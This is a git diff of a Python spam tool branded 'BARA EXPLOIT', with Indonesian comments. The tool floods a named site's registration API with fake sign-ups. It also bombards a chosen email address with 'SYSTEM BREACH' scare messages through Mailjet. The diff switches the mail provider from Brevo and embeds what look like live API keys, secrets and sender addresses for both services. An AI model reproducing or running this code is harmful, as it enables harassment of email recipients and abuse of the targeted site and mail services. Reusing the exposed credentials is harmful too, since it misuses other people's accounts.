@@ -1,6 +1,4 @@
 import requests
-import socket
-import urllib3
 import random
 import string
 import time
@@ -8,17 +6,8 @@ import os
 import sys
 import json
 import subprocess
+import base64
 from concurrent.futures import ThreadPoolExecutor
-
-# ==========================================
-# TRIK SAKTI: PAKSA PYTHON PAKE IPV4 DOANG
-# ==========================================
-urllib3.disable_warnings()
-_original_getaddrinfo = socket.getaddrinfo
-def getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
-    return _original_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
-socket.getaddrinfo = getaddrinfo_ipv4
-# ==========================================
 
 try:
     from colorama import init, Fore, Style
@@ -33,11 +22,11 @@ except ImportError:
 TARGET_URL = "https://nova-wawa.vercel.app/api/register"
 USED_KEYS_FILE = "used_keys.txt"
 
-# KONFIGURASI BREVO API V3
-BREVO_API_KEY = "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"
-BREVO_API_URL = "https://api.brevo.com/v3/smtp/email"
-PENGIRIM_EMAIL = "ttingg48@gmail.com" 
-PENGIRIM_NAMA = "BARA EXPLOIT"
+# --- KONFIGURASI MAILJET ---
+MAILJET_API_KEY = "852c378f1a0e325dc8ef78279aa99858"
+MAILJET_SECRET_KEY = "21d54f4567c06de75b11dc0a9c8d2153"
+MAILJET_SENDER_EMAIL = "partosartini41@gmail.com" 
+MAILJET_SENDER_NAME = "BARA EXPLOIT"
 
 # Kode Warna ANSI
 C_RED = '\033[91m'
@@ -83,9 +72,7 @@ def get_decrypted_keys():
         result = subprocess.run(['node', 'get_key.js'], capture_output=True, text=True)
         if result.returncode != 0:
             print(f"\n{C_RED}[❌] Gagal decrypt apikey.js (Error Node.js).{C_RESET}")
-            print(f"{C_YELLOW}[DEBUG] Stderr: {result.stderr[:100]}{C_RESET}")
             return []
-            
         keys = json.loads(result.stdout)
         return keys
     except FileNotFoundError:
@@ -154,41 +141,39 @@ def eksekusi_spam(jumlah):
     print(f"{C_GREEN}[✅] SPAM SELESAI! Sukses: {sukses} | Gagal: {jumlah - sukses} | Waktu: {elapsed:.2f}s{C_RESET}")
 
 # ==========================================
-# MENU 2: SPAM EMAIL (BREVO API V3)
+# MENU 2: SPAM EMAIL (MAILJET API - UI BARU)
 # ==========================================
-def kirim_email_brevo_api(target, pesan):
-    # GANTI BASE64 INI PAKE GAMBAR LO
-    img_base64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+ip1sAAAAASUVORK5CYII=" 
-    
+def kirim_email_mailjet(target, pesan):
+    # UI Baru: Cyberpunk Neon Glassmorphism (Aman di Gmail)
+    img_base64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+ip1sAAAAASUVORK5CYII="
+
     html_content = f"""
     <!DOCTYPE html>
     <html>
     <head>
         <meta charset="UTF-8">
     </head>
-    <body style="margin: 0; padding: 0; background-color: #050505; font-family: 'Courier New', monospace;">
-        <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #050505; padding: 20px;">
+    <body style="margin: 0; padding: 0; background-color: #080808; font-family: 'Courier New', monospace;">
+        <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #080808; padding: 30px 15px;">
             <tr>
                 <td align="center">
-                    <table width="100%" max-width="500" border="0" cellspacing="0" cellpadding="20" style="background-color: #111111; border: 2px solid #00ff41; border-radius: 10px; text-align: center;">
+                    <table width="100%" max-width="550" border="0" cellspacing="0" cellpadding="30" style="background: linear-gradient(135deg, #1a001a 0%, #000000 100%); border: 2px solid #ff003c; border-radius: 15px; text-align: center; box-shadow: 0 0 30px rgba(255, 0, 60, 0.3);">
                         <tr>
                             <td>
-                                <h1 style="color: #ff003c; font-size: 26px; margin: 0 0 20px 0; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px #ff003c;">SYSTEM BREACH</h1>
+                                <h1 style="color: #ff003c; font-size: 32px; margin: 0 0 20px 0; text-transform: uppercase; letter-spacing: 3px; text-shadow: 0 0 15px #ff003c, 0 0 30px #ff003c;">SYSTEM BREACH</h1>
                                 
-                                <img src="data:image/png;base64,{img_base64}" width="100%" style="max-height: 200px; object-fit: cover; border-radius: 8px; border: 1px solid #00ff41; margin-bottom: 20px; display: block;" alt="System Hacked">
+                                <!-- GAMBAR PLACEHOLDER -->
+                                <img src="data:image/png;base64,{img_base64}" width="100%" style="max-height: 200px; object-fit: cover; border-radius: 8px; border: 1px solid #00e5ff; margin-bottom: 25px; display: block;" alt="System Hacked">
                                 
-                                <div style="background-color: rgba(0, 255, 65, 0.1); border-left: 4px solid #00ff41; padding: 15px; text-align: left; color: #ffffff; font-size: 15px; margin-bottom: 25px; line-height: 1.5;">
+                                <!-- KOTAK PESAN -->
+                                <div style="background-color: rgba(0, 229, 255, 0.1); border-left: 5px solid #00e5ff; border-right: 5px solid #00e5ff; padding: 20px; text-align: left; color: #ffffff; font-size: 16px; margin-bottom: 30px; line-height: 1.6;">
                                     {pesan}
                                 </div>
                                 
-                                <div style="margin-bottom: 20px;">
-                                    <a href="https://files.catbox.moe/6xi33i.mp3" target="_blank" style="display: inline-block; background-color: #111111; border: 1px solid #00ff41; color: #00ff41; text-decoration: none; padding: 12px 25px; border-radius: 6px; font-weight: bold; font-size: 14px; text-transform: uppercase;">
-                                        🔊 BUKA AUDIO
-                                    </a>
-                                </div>
-                                
-                                <div style="font-size: 12px; color: #555555; margin-top: 30px; border-top: 1px dashed #333333; padding-top: 15px; text-transform: uppercase; letter-spacing: 1px;">
-                                    DEV: BARA | BARA EXPLOIT
+                                <!-- FOOTER -->
+                                <div style="font-size: 12px; color: #00e5ff; margin-top: 30px; border-top: 1px dashed #333333; padding-top: 20px; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 5px #00e5ff;">
+                                    <strong>DEV: BARA</strong><br>
+                                    <span style="color: #555555; font-size: 10px;">BARA EXPLOIT TOOLKING</span>
                                 </div>
                             </td>
                         </tr>
@@ -199,23 +184,29 @@ def kirim_email_brevo_api(target, pesan):
     </body>
     </html>
     """
-
+    
+    auth_string = f"{MAILJET_API_KEY}:{MAILJET_SECRET_KEY}"
+    auth_b64 = base64.b64encode(auth_string.encode()).decode()
+    
     headers = {
-        "accept": "application/json",
-        "content-type": "application/json",
-        "api-key": BREVO_API_KEY
+        "Content-Type": "application/json",
+        "Authorization": f"Basic {auth_b64}"
     }
-
+    
     payload = {
-        "sender": {"name": PENGIRIM_NAMA, "email": PENGIRIM_EMAIL},
-        "to": [{"email": target}],
-        "subject": f"⚠️ SYSTEM ALERT {random.randint(100, 999)}",
-        "htmlContent": html_content
+        "Messages": [
+            {
+                "From": {"Email": MAILJET_SENDER_EMAIL, "Name": MAILJET_SENDER_NAME},
+                "To": [{"Email": target}],
+                "Subject": f"⚠️ WARNING: SYSTEM ALERT {random.randint(100, 999)}",
+                "HTMLPart": html_content
+            }
+        ]
     }
-
+    
     try:
-        res = requests.post(BREVO_API_URL, headers=headers, json=payload, timeout=10, verify=False)
-        if res.status_code in [200, 201, 202]:
+        res = requests.post("https://api.mailjet.com/v3.1/send", headers=headers, json=payload, timeout=10)
+        if res.status_code in [200, 201]:
             return True, "OK"
         else:
             return False, f"HTTP {res.status_code}: {res.text}"
@@ -224,17 +215,8 @@ def kirim_email_brevo_api(target, pesan):
 
 def eksekusi_spam_email():
     clear()
-    print(f"{C_CYAN}=== SPAM EMAIL (BREVO API V3) ==={C_RESET}")
-    
-    # IP CHECKER BUAT REMINDER LO
-    print(f"{C_YELLOW}[*] Cek IP lo sekarang (Whitelist ini di Brevo!):{C_RESET}")
-    try:
-        ip_res = requests.get("https://api.ipify.org?format=json", timeout=3)
-        print(f"{C_GREEN}    IP LO: {ip_res.json()['ip']}{C_RESET}")
-    except:
-        print(f"{C_RED}    Gagal cek IP.{C_RESET}")
-        
-    target = input(f"\n{C_YELLOW}Email Target: {C_RESET}")
+    print(f"{C_CYAN}=== SPAM EMAIL (MAILJET API) ==={C_RESET}")
+    target = input(f"{C_YELLOW}Email Target: {C_RESET}")
     pesan = input(f"{C_YELLOW}Pesan: {C_RESET}")
     try:
         jumlah = int(input(f"{C_YELLOW}Jumlah spam: {C_RESET}"))
@@ -244,7 +226,7 @@ def eksekusi_spam_email():
     print(f"\n{C_YELLOW}[*] Memproses...{C_RESET}")
     sukses = 0
     for i in range(1, jumlah + 1):
-        berhasil, error_msg = kirim_email_brevo_api(target, pesan)
+        berhasil, error_msg = kirim_email_mailjet(target, pesan)
         if berhasil:
             sukses += 1
             print(f"{C_GREEN}[✅] [{i}/{jumlah}] Terkirim!{C_RESET}")
@@ -290,7 +272,7 @@ def main():
                 BARA EXPLOIT - MAIN MENU
 ======================================================
 {C_YELLOW}1. {C_WHITE}Spam Register (Nova Wawa)
-{C_YELLOW}2. {C_WHITE}Spam Email (Brevo API V3)
+{C_YELLOW}2. {C_WHITE}Spam Email (Mailjet API)
 {C_YELLOW}0. {C_WHITE}Keluar
 {m_c}======================================================
 {C_WHITE}Dev: BARA | Key: {user_key[:5]}***{C_RESET}""")
